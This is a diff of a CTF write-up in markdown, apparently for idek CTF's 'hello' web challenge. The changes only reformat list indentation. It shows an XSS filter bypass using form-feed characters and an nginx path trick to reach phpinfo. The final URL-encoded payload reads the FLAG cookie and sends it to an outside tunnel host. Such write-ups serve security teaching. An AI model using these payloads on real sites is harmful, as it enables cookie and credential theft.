@@ -240,21 +240,21 @@ console.log(value)
 
 The code itself should be self-explanatory, but if you need an explanation:
 
--   I grab all elements with the class `e` - this is all the keys on the left side
-    of the table - then filtering for the element that has the exact text I'm
-    looking for, in this case `$_COOKIE['test']`.
--   I grab this element's parent element, which should be the `<tr>` in the example above.
--   Knowing that this element has exactly two children, I grab the second one
-    (index `1`), and this should be the value of the key I'm looking for.
+- I grab all elements with the class `e` - this is all the keys on the left side
+  of the table - then filtering for the element that has the exact text I'm
+  looking for, in this case `$_COOKIE['test']`.
+- I grab this element's parent element, which should be the `<tr>` in the example above.
+- Knowing that this element has exactly two children, I grab the second one
+  (index `1`), and this should be the value of the key I'm looking for.
 
 ## Putting all this together
 
 With all of this knowledge, our game plan is clear:
 
--   The admin bot _will_ go to the challenge instance, and then set a flag.
--   The "visited" URL will be the challenge instance again, but with a script in
-    the `name` parameter to access `info.php`
--   Fetch the cookie `FLAG` out and send it back to our server.
+- The admin bot _will_ go to the challenge instance, and then set a flag.
+- The "visited" URL will be the challenge instance again, but with a script in
+  the `name` parameter to access `info.php`
+- Fetch the cookie `FLAG` out and send it back to our server.
 
 Let's craft our script in "normal" JavaScript first.
 
@@ -295,25 +295,23 @@ Attached under here is my original draft when I was brainstorming for it...
 ````md
 ## todo
 
--   snoop source code
--   query `?name=<string>`, plan is to get xss somehow.
-
-    -   this is not sanitized, injecting `<script>` works?
-        -   `Enhanced_Trim($inp)` trims away `/`, can't close `<script>` tag.
-    -   tracking pixel? `<img onload="">`?
-
-        -   `Enhanced_Trim($inp)` trims away spaces, can't write the `onload` attribute.
-        -   using 0x0C as a replacement for spaces works.
-        -   sanity check: `<img%0Conerror%3D"alert("hi")"%0Csrc="">` works as we expected.
-        -   can't do `fetch("http://some.domain")` because forward slashes are trimmed out.
-        -   seems like the method is to fetch stuff _in_ the server?
-        -   forward a request from our `TARGET_URL` back to the server, including credentials using `{ credentials: "include" }` as an attempt to leak cookies
-            -   doesn't work, don't even bother, `HttpOnly` too strong.
-        -   `info.php` prints the result of `phpinfo()`, would it leak the cookie from the request?
-            -   fetching from the site using `?name=` throws a 403
-            -   fetching it from the target url _also_ throws a 403?
-            -   inserting `Host` and `Origin` headers doesn't work.
-        -   vulnerability in nginx config:
+- snoop source code
+- query `?name=<string>`, plan is to get xss somehow.
+    - this is not sanitized, injecting `<script>` works?
+        - `Enhanced_Trim($inp)` trims away `/`, can't close `<script>` tag.
+    - tracking pixel? `<img onload="">`?
+        - `Enhanced_Trim($inp)` trims away spaces, can't write the `onload` attribute.
+        - using 0x0C as a replacement for spaces works.
+        - sanity check: `<img%0Conerror%3D"alert("hi")"%0Csrc="">` works as we expected.
+        - can't do `fetch("http://some.domain")` because forward slashes are trimmed out.
+        - seems like the method is to fetch stuff _in_ the server?
+        - forward a request from our `TARGET_URL` back to the server, including credentials using `{ credentials: "include" }` as an attempt to leak cookies
+            - doesn't work, don't even bother, `HttpOnly` too strong.
+        - `info.php` prints the result of `phpinfo()`, would it leak the cookie from the request?
+            - fetching from the site using `?name=` throws a 403
+            - fetching it from the target url _also_ throws a 403?
+            - inserting `Host` and `Origin` headers doesn't work.
+        - vulnerability in nginx config:
 
             ```
             location ~ \.php$ {
@@ -324,25 +322,25 @@ Attached under here is my original draft when I was brainstorming for it...
             }
             ```
 
-            -   can access `info.php` by using `info.php/index.php` as route.
+            - can access `info.php` by using `info.php/index.php` as route.
 
-        -   now to somehow leak it using the puppeteer instance.
-        -   `\` is a valid separator -> this works for the the fetches
-        -   access from the given url because of cors: `?name=%3Cimg%0Conerror%3D%27fetch(%22info.php\\index.php%22%2C%20%7B%20credentials%3A%20%22include%22%7D)%27%0Csrc=%22%22%3E`
-        -   wait but the flag is set **AFTER** you go to the site.
-        -   the browser gets set to `null` after you're done -> you don't have a second chance
-        -   flow looks like:
-            -   go to site
-            -   flag gets set
-            -   **somehow** fetch `info.php` to leak flag
-            -   send back to our server
-        -   this means `TARGET_URL` has to be the challenge instance _again_ to view leaked flag?
-        -   final script:`http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Conerror%3D%22fetch%28%27info.php%5C%5Cindex.php%27%2C%7Bcredentials%3A%27include%27%7D%29.then%28response%3D%3Eresponse.text%28%29%29.then%28data%3D%3E%7Bdocument.body.innerHTML%3Ddata%3Bfetch%28%27https%3A%5C%5C%5C%5Cbar-fleet-nm-super.trycloudflare.com%5C%5C%27%2BArray.from%28document.getElementsByClassName%28%27e%27%29%29.filter%28item%3D%3Eitem.innerText%3D%3D%3D%27%24_COOKIE%5B%5C%27FLAG%5C%27%5D%27%29%5B0%5D.parentElement.children%5B1%5D.innerText%29%7D%29.catch%28e%3D%3Edocument.body.innerHTML%3De%29%3B%22%0Csrc=%22%22%3E`
-        -   methodology:
-            -   bypass nginx config to access `info.php`
-            -   dump `info.php` to current document
-            -   fetch flag from the html
-            -   send a request back to a server
+        - now to somehow leak it using the puppeteer instance.
+        - `\` is a valid separator -> this works for the the fetches
+        - access from the given url because of cors: `?name=%3Cimg%0Conerror%3D%27fetch(%22info.php\\index.php%22%2C%20%7B%20credentials%3A%20%22include%22%7D)%27%0Csrc=%22%22%3E`
+        - wait but the flag is set **AFTER** you go to the site.
+        - the browser gets set to `null` after you're done -> you don't have a second chance
+        - flow looks like:
+            - go to site
+            - flag gets set
+            - **somehow** fetch `info.php` to leak flag
+            - send back to our server
+        - this means `TARGET_URL` has to be the challenge instance _again_ to view leaked flag?
+        - final script:`http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Conerror%3D%22fetch%28%27info.php%5C%5Cindex.php%27%2C%7Bcredentials%3A%27include%27%7D%29.then%28response%3D%3Eresponse.text%28%29%29.then%28data%3D%3E%7Bdocument.body.innerHTML%3Ddata%3Bfetch%28%27https%3A%5C%5C%5C%5Cbar-fleet-nm-super.trycloudflare.com%5C%5C%27%2BArray.from%28document.getElementsByClassName%28%27e%27%29%29.filter%28item%3D%3Eitem.innerText%3D%3D%3D%27%24_COOKIE%5B%5C%27FLAG%5C%27%5D%27%29%5B0%5D.parentElement.children%5B1%5D.innerText%29%7D%29.catch%28e%3D%3Edocument.body.innerHTML%3De%29%3B%22%0Csrc=%22%22%3E`
+        - methodology:
+            - bypass nginx config to access `info.php`
+            - dump `info.php` to current document
+            - fetch flag from the html
+            - send a request back to a server
 ````
 
 Now excuse me, I need a huge nap to recover from all this.
